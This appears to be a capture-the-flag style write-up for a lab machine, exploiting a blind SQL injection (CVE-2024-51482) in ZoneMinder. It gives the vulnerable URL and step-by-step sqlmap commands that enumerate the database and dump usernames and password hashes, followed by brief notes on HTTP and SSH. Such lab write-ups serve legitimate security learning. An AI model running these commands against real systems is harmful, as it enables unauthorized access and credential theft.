## Vulnerability Identification

- From the path zoneminder is the software  
- Has many known vulnerabilities  

- Found CVE-2024-51482  
  - Critical Boolean-based Blind SQL Injection vulnerability in ZoneMinder  

- Trigger URL:  
  http://[TARGET]/zm/index.php?view=request&request=event&action=removetag&tid=[INJECTION_POINT]  

---

## SQLMap Exploitation

### Initial Command

sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=*" \
--cookie="ZMSESSID=79e4v7guebkneps7l6uq34e43j" \
--dbms=mysql --level=3 --risk=2 --batch --current-db --threads=5  

### Explanation

- --dbms=mysql  
  ZoneMinder uses MySQL/MariaDB  

- --level=3  
  Increases payload variety  

- --risk=2  
  Allows heavy OR-based tests  

- --technique=B  
  Boolean-based blind  

- --threads=5  
  Speeds up extraction  

- --current-db  
  Retrieves database name  

---

## Modified Command (Time-Based Injection)

sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1*" \
--cookie="ZMSESSID=79e4v7guebkneps7l6uq34e43j" \
--dbms=mysql --batch --level=5 --risk=3 \
--technique=T --time-sec=5 --threads=1 \
--current-db  

### Notes

- Technique changed from B to T (Boolean → Time-based)  
- Uses sleep to time the response  
- Must use 1 thread (avoid timing conflicts)  
- --time-sec=5 ensures clear delay  

- This gives the current database:  
  zm  

---

## Database Enumeration

### Get Tables

sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1*" \
--cookie="ZMSESSID=79e4v7guebkneps7l6uq34e43j" \
--dbms=mysql --batch -D zm --tables  

- -D is the database  

---

### Get Columns

sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1*" \
--cookie="ZMSESSID=79e4v7guebkneps7l6uq34e43j" \
--dbms=mysql --batch -D zm -T Users --columns  

- -T is the table name  

---

### Dump Credentials

sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1*" \
--cookie="ZMSESSID=79e4v7guebkneps7l6uq34e43j" \
--dbms=mysql --batch -D zm -T Users -C "Username,Password" --dump  

---

## Concepts

### HTTP (Port 80)

- HTTP is the protocol used to load websites  
- Browser sends request to:
  - IP of the server  
  - Port 80  

- Not encrypted  
- Data is sent in plain text  
- Vulnerable to attacks (MITM, sniffing)  

---

### SSH (Port 22)

- SSH lets you securely connect to another computer remotely  

ssh user@192.168.1.10  

- Encrypted communication  
- Used by system admins and pentesters  
- Provides command-line access to another machine  
